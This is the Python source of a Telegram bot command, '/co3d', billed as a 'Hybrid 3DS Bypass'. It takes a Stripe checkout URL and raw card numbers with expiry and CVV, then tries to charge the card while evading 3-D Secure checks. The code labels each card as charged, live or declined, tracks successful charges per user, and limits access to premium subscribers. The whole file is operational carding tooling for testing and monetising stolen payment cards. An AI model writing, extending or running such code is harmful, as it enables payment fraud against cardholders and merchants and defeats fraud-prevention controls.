import time
import logging
import aiohttp
from aiogram import Router
from aiogram.types import Message
from aiogram.filters import Command
from aiogram.enums import ParseMode

logger = logging.getLogger(__name__)
router = Router()

from config import ALLOWED_GROUP, OWNER_ID, ALLOWED_USERS, PREMIUM_USERS, USER_STATS
from functions.co_functions import parse_stripe_checkout
from functions.hybrid_charge import charge_card_hybrid
from functions.charge_functions import init_checkout, parse_card
import json

def save_stats():
    try:
        import os
        os.makedirs('/root/3D', exist_ok=True)
        with open('/root/3D/user_stats.json', 'w') as f:
            json.dump(USER_STATS, f)
    except Exception as e:
        logger.error(f"Error saving stats: {e}")

def check_access(msg: Message) -> bool:
    if not msg.from_user:
        return False
    user_id = msg.from_user.id
    if user_id == OWNER_ID:
        return True
    if user_id in ALLOWED_USERS:
        return True
    if user_id in PREMIUM_USERS:
        from datetime import datetime
        if datetime.now().timestamp() < PREMIUM_USERS[user_id]:
            return True
    if msg.chat.id == ALLOWED_GROUP:
        return True
    return False

@router.message(Command("co3d"))
async def co3d_handler(msg: Message):
    if not check_access(msg):
        await msg.answer(
            "<blockquote><code>𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱 ❌</code></blockquote>\n\n"
            "<blockquote>「❃」 𝗝𝗼𝗶𝗻 𝘁𝗼 𝘂𝘀𝗲 : <code>https://t.me/+Sw15ZeV_gmZiMzc9</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Track user stats
    user_id = msg.from_user.id
    if user_id not in USER_STATS:
        USER_STATS[user_id] = {
            "name": msg.from_user.first_name,
            "username": msg.from_user.username or "None",
            "checkouts": 0,
            "charged": 0
        }
    USER_STATS[user_id]["checkouts"] += 1
    save_stats()
    
    args = msg.text.split(maxsplit=1)
    if len(args) < 2:
        await msg.answer(
            "<blockquote><code>𝗛𝘆𝗯𝗿𝗶𝗱 𝟯𝗗𝗦 𝗕𝘆𝗽𝗮𝘀𝘀 ⚡</code></blockquote>\n\n"
            "<blockquote>「❃」 𝗨𝘀𝗮𝗴𝗲 : <code>/co3d url cc|mm|yy|cvv</code>\n"
            "「❃」 𝗠𝗲𝘁𝗵𝗼𝗱 𝟭 : Profile Rotation (10 profiles)\n"
            "「❃」 𝗠𝗲𝘁𝗵𝗼𝗱 𝟮 : API Fallback</blockquote>",
            parse_mode=ParseMode.HTML
        )
        return
    
    parts = args[1].split()
    if len(parts) < 2:
        await msg.answer(
            "<blockquote><code>𝗘𝗿𝗿𝗼𝗿 ❌</code></blockquote>\n\n"
            "<blockquote>「❃」 𝗨𝘀𝗮𝗴𝗲 : <code>/co3d url cc|mm|yy|cvv</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        return
    
    url = parts[0]
    card_str = parts[1]
    
    # Parse card
    card = parse_card(card_str)
    if not card:
        await msg.answer(
            "<blockquote><code>𝗘𝗿𝗿𝗼𝗿 ❌</code></blockquote>\n\n"
            "<blockquote>「❃」 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗰𝗮𝗿𝗱 𝗳𝗼𝗿𝗺𝗮𝘁</blockquote>",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Parse checkout
    processing_msg = await msg.answer(
        "<blockquote><code>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 ⏳</code></blockquote>",
        parse_mode=ParseMode.HTML
    )
    
    checkout_data = await parse_stripe_checkout(url)
    
    if checkout_data.get("error"):
        await processing_msg.edit_text(
            "<blockquote><code>𝗘𝗿𝗿𝗼𝗿 ❌</code></blockquote>\n\n"
            f"<blockquote>「❃」 {checkout_data.get('error')}</blockquote>",
            parse_mode=ParseMode.HTML
        )
        return
    
    pk = checkout_data.get("pk")
    cs = checkout_data.get("cs")
    
    if not pk or not cs:
        await processing_msg.edit_text(
            "<blockquote><code>𝗘𝗿𝗿𝗼𝗿 ❌</code></blockquote>\n\n"
            "<blockquote>「❃」 𝗖𝗼𝘂𝗹𝗱 𝗻𝗼𝘁 𝗲𝘅𝘁𝗿𝗮𝗰𝘁 𝗣𝗞/𝗖𝗦</blockquote>",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Initialize checkout
    try:
        async with aiohttp.ClientSession() as session:
            init_data = await init_checkout(pk, cs)
            
            if "error" in init_data:
                await processing_msg.edit_text(
                    "<blockquote><code>𝗘𝗿𝗿𝗼𝗿 ❌</code></blockquote>\n\n"
                    f"<blockquote>「❃」 {init_data['error'].get('message', 'Init failed')}</blockquote>",
                    parse_mode=ParseMode.HTML
                )
                return
            
            # Charge with hybrid bypass
            result = await charge_card_hybrid(card, pk, cs, init_data, session)
    except Exception as e:
        logger.error(f"Charge error: {e}")
        await processing_msg.edit_text(
            "<blockquote><code>𝗘𝗿𝗿𝗼𝗿 ❌</code></blockquote>\n\n"
            f"<blockquote>「❃」 {str(e)[:100]}</blockquote>",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Get merchant info
    merchant = checkout_data.get("merchant", "Unknown")
    price = checkout_data.get("price", "0")
    currency = checkout_data.get("currency", "USD")
    product = checkout_data.get("product", "Unknown")
    
    # Format response
    status = result.get("status")
    response_msg = result.get("response")
    bypass_method = result.get("bypass_method")
    elapsed = result.get("time", 0)
    
    if status == "CHARGED":
        status_emoji = "✅"
        status_text = "CHARGED"
        if bypass_method:
            USER_STATS[user_id]["charged"] += 1
            save_stats()
    elif status == "LIVE":
        status_emoji = "✅"
        status_text = "LIVE"
    elif status == "DECLINED":
        status_emoji = "❌"
        status_text = "DECLINED"
    elif status == "3DS FAIL":
        status_emoji = "⚠️"
        status_text = "3DS BYPASS FAILED"
    else:
        status_emoji = "⚠️"
        status_text = status or "ERROR"
    
    response = f"<blockquote><code>「 𝗛𝘆𝗯𝗿𝗶𝗱 𝟯𝗗𝗦 {price} {currency} 」</code></blockquote>\n\n"
    response += f"<blockquote>「❃」 𝗖𝗮𝗿𝗱 : <code>{card_str}</code>\n"
    response += f"「❃」 𝗦𝘁𝗮𝘁𝘂𝘀 : <code>{status_text} {status_emoji}</code>\n"
    response += f"「❃」 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : <code>{response_msg}</code></blockquote>\n\n"
    response += f"<blockquote>「❃」 𝗠𝗲𝗿𝗰𝗵𝗮𝗻𝘁 : <code>{merchant}</code>\n"
    response += f"「❃」 𝗣𝗿𝗼𝗱𝘂𝗰𝘁 : <code>{product}</code></blockquote>\n\n"
    response += f"<blockquote>「❃」 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 : <code>/co3d</code>\n"
    response += f"「❃」 𝗧𝗶𝗺𝗲 : <code>{elapsed}s</code></blockquote>"
    
    await processing_msg.edit_text(response, parse_mode=ParseMode.HTML)
